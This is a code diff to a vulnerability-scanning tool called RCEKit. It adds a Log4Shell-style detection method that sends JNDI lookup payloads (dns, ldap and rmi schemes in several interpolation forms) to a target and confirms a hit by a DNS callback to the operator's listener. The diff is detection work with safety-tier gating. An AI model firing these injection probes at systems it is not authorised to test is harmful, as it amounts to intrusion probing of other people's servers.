@@ -45,7 +45,7 @@ def configure_logging() -> None:
 
 # Bump on every change: PATCH for fixes, MINOR for new capabilities, MAJOR for
 # breaking changes to the CLI, output formats, or template schema.
-__version__ = "2.35.5"
+__version__ = "2.36.0"
 
 SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}
 
@@ -4920,6 +4920,158 @@ class OobCallback(DetectionMethod):
         return Verdict("negative", "no out-of-band callback received for any probe")
 
 
+class LookupCallback(DetectionMethod):
+    """Out-of-band confirmation for an **expression-lookup** sink -- the shape
+    Log4Shell has, where the sink resolves a URI rather than running a command.
+
+    ``oob`` cannot reach one. Its ``applicable`` does admit ``java`` -- a Java
+    application can shell out, so the environment is genuinely shell-capable --
+    but every probe it builds is a shell command: ``nslookup``, ``curl``,
+    ``certutil``, ``iwr``. A sink that interpolates ``${jndi:...}`` runs none of
+    them, so the method applies, sends its whole ladder, and comes back
+    ``negative`` on a target that is exploitable. The README's Log4Shell row
+    rested on the standalone listener and a generated payload file, which
+    produce no verdict row at all, so nothing in the engine could reproduce that
+    claim.
+
+    The probes are lookups and nothing else, and they depend on the injection
+    *context* rather than the environment, exactly as :class:`EvalExpr`'s do: a
+    template that interpolates is not a shell.
+
+    The oracle is the one :class:`OobCallback` already uses -- a token the
+    target could only have learned by resolving what it was handed. Every form
+    starts by resolving ``<token>.<host>``, so RCEKit's own in-process DNS
+    listener catches all three; no LDAP or RMI server is needed, and none is
+    started.
+
+    **The listener never serves a class.** ``jndi:dns://`` is a name lookup and
+    can be nothing else. ``ldap://`` and ``rmi://`` ship because sinks differ in
+    which schemes they allow, and they do attempt a connection -- but what
+    answers is RCEKit's DNS listener, which returns no object, so nothing is
+    ever fetched or deserialized. The proof is the callback, and the finding is
+    "this sink resolved a URI I chose", which is what a lookup sink *is*. That
+    is the same line ``deser`` draws, drawn here before it can be crossed.
+
+    Requires ``--oob-host``. Without it there are no probes, which is
+    ``nothing-tested`` -- never ``negative``."""
+    name = "lookup"
+    tier = "confirmed"
+    # Callbacks are asynchronous: one can arrive well after the response that
+    # triggered it, so no probe can be judged until the batch has been fired.
+    aggregate = True
+
+    # The lookup schemes to try. dns:// first: it is the one that cannot do
+    # anything but resolve a name, so it is the shape to lead with.
+    _SCHEMES = ("dns", "ldap", "rmi")
+    # The interpolation syntaxes a lookup sink may use. `${...}` is Log4j's and
+    # JSP EL's; `#{...}` and `%{...}` are here because an expression evaluator
+    # that refuses arithmetic may still resolve a URI, which is the case this
+    # method exists for.
+    _FORMS = ("${{{expr}}}", "#{{{expr}}}", "%{{{expr}}}")
+
+    def __init__(self, gen: "RCEKit", config: Optional[Dict[str, Any]] = None):
+        super().__init__(gen, config)
+        # token -> the scheme that produced it, for the evidence line.
+        self._scheme: Dict[str, str] = {}
+        self._waited_once = False
+
+    def applicable(self, record: "PayloadRecord") -> bool:
+        # A lookup is an expression, not a command, so no environment is
+        # excluded -- but without somewhere to call back there is nothing to
+        # prove, and a probe that cannot confirm is a request wasted.
+        return bool(self.config.get("oob_host"))
+
+    @staticmethod
+    def _is_ip_literal(host: str) -> bool:
+        parts = host.split(".")
+        return len(parts) == 4 and all(p.isascii() and p.isdigit() for p in parts)
+
+    def _token(self, rng: "random.Random") -> str:
+        # Lowercase letters and digits only: a DNS label is case-insensitive and
+        # the listener correlates case-folded, so a mixed-case token would only
+        # invite a 0x20-encoding resolver to mangle the comparison.
+        return "rk" + "".join(rng.choice(string.ascii_lowercase + string.digits)
+                              for _ in range(10))
+
+    def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
+        host = str(self.config["oob_host"]).strip().rstrip(".")
+        if self._is_ip_literal(host):
+            # A bare IP cannot carry a token as a DNS label: there is nothing to
+            # delegate and `<token>.10.0.0.1` resolves nowhere. A lookup has no
+            # second channel to put the token in the way an HTTP probe does, so
+            # rather than send probes that could never be attributed, send none.
+            return []
+        listener = self.config.get("oob_listener")
+        schemes = self._SCHEMES if self._depth() != "quick" else self._SCHEMES[:1]
+        probes: List[Probe] = []
+        for scheme in schemes:
+            for form in self._FORMS:
+                token = self._token(rng)
+                expr = "jndi:%s://%s.%s/a" % (scheme, token, host)
+                payload = self._wrap_context(record, form.format(expr=expr))
+                probes.append(Probe(payload=payload, expected=token, carrier=scheme))
+                self._scheme[token] = scheme
+                if listener is not None:
+                    # Register with the listener, which correlates an incoming
+                    # callback by looking for a known token in the queried name.
+                    listener.tokens[token] = {
+                        "payload": payload, "category": "detection",
+                        "context": record.context,
+                    }
+        return probes
+
+    def confirm_each(self, series: "List[Tuple[Probe, Observation]]"
+                     ) -> "Optional[List[Tuple[Probe, Verdict]]]":
+        import time
+
+        listener = self.config.get("oob_listener")
+        wait = float(self.config.get("oob_wait", 6.0))
+        if listener is None:
+            return [(probe, Verdict("error", "no OOB listener was started"))
+                    for probe, _ in series]
+        # Same grace rule as `oob`: the first carrier gets the full window, and a
+        # target that has called back for nothing so far is not going to start on
+        # the next carrier, so the rest get a grace period instead.
+        if self._waited_once and not listener.hits:
+            wait = min(wait, 1.5)
+        self._waited_once = True
+        deadline = time.time() + wait
+        wanted = {probe.expected for probe, _ in series}
+        while time.time() < deadline:
+            if wanted <= {hit.get("token") for hit in listener.hits}:
+                break
+            time.sleep(0.25)
+        received: Dict[Any, Any] = {}
+        for hit in listener.hits:
+            received.setdefault(hit.get("token"), hit)
+        out: List[Tuple[Probe, Verdict]] = []
+        for probe, obs in series:
+            hit = received.get(probe.expected)
+            if hit:
+                scheme = self._scheme.get(probe.expected, "jndi")
+                out.append((probe, Verdict(
+                    "confirmed",
+                    "target resolved a %s lookup RCEKit chose, calling back over %s with "
+                    "token %r -- the sink evaluated the expression it was handed. The "
+                    "listener served no object, so this proves the lookup, not a gadget "
+                    "chain" % (scheme, hit.get("proto"), probe.expected))))
+            elif obs.status is None:
+                out.append((probe, Verdict(
+                    "error", "request never reached the target (%s)" % obs.body[:120])))
+            else:
+                out.append((probe, Verdict("negative", "no callback for this probe's token")))
+        return out
+
+    def confirm_series(self, series: "List[Tuple[Probe, Observation]]") -> Verdict:
+        # confirm_each carries the real logic; this only runs if an engine calls
+        # the series form, and must agree with it.
+        each = self.confirm_each(series) or []
+        confirmed = [verdict for _, verdict in each if verdict.status == "confirmed"]
+        if confirmed:
+            return confirmed[0]
+        return Verdict("negative", "no lookup callback received for any probe")
+
+
 # The detection methods RCEKit can run, keyed by their --methods name. Adding a
 # phase = adding a class above and an entry here.
 class DeserSink(DetectionMethod):
@@ -5192,6 +5344,7 @@ DETECTION_METHODS = {
     ParametricTime.name: ParametricTime,
     EvalExpr.name: EvalExpr,
     OobCallback.name: OobCallback,
+    LookupCallback.name: LookupCallback,
     DeserSink.name: DeserSink,
 }
 
@@ -5311,6 +5464,9 @@ def blind_sink_advice(method_names: List[str], args: Any) -> List[str]:
     # to run is its own small version of the problem this function exists for.
     lines.append("[detect]   --methods oob --oob-host HOST --verify-active-risk intrusive   "
                  "(needs egress from the target; confirms)")
+    lines.append("[detect]   --methods lookup --oob-host HOST --verify-active-risk intrusive   "
+                 "(same listener, for a sink that interpolates ${...} rather than shelling "
+                 "out; confirms)")
     if not ((getattr(args, "webroot", None) and getattr(args, "web_base_url", None))
             or (getattr(args, "file_write_path", None)
                 and getattr(args, "file_read_url", None))):
@@ -6640,9 +6796,12 @@ def main(argv: Optional[List[str]] = None) -> int:
                                 "contexts_explicit": bool(selected_contexts),
                                 "oob_host": args.oob_host,
                                 "oob_http_port": args.listen_http_port}
-            if OobCallback.name in method_names:
+            callback_methods = [m for m in (OobCallback.name, LookupCallback.name)
+                                if m in method_names]
+            if callback_methods:
                 if not args.oob_host:
-                    print("[!] --methods oob makes the TARGET call back to a listener, so it needs "
+                    print("[!] --methods " + "/".join(callback_methods) + " makes the TARGET call back to a "
+                          "listener, so it needs "
                           "--oob-host: an address the target can reach that arrives here (an IP on "
                           "a routable interface, or a domain delegated to this host).")
                     return 1
@@ -6655,7 +6814,8 @@ def main(argv: Optional[List[str]] = None) -> int:
                 # fired OOB anyway: the run contradicted itself, and the tier the
                 # operator chose did not mean what it said.
                 if verify_max_safety == "safe":
-                    print("[!] --methods oob makes the TARGET open outbound connections, which is an "
+                    print("[!] --methods " + "/".join(callback_methods) + " makes the TARGET open outbound "
+                          "connections, which is an "
                           "active technique held back at the default safety tier — the same tier that "
                           "holds back the corpus OOB payloads. Pass --verify-active-risk intrusive to "
                           "allow it.")
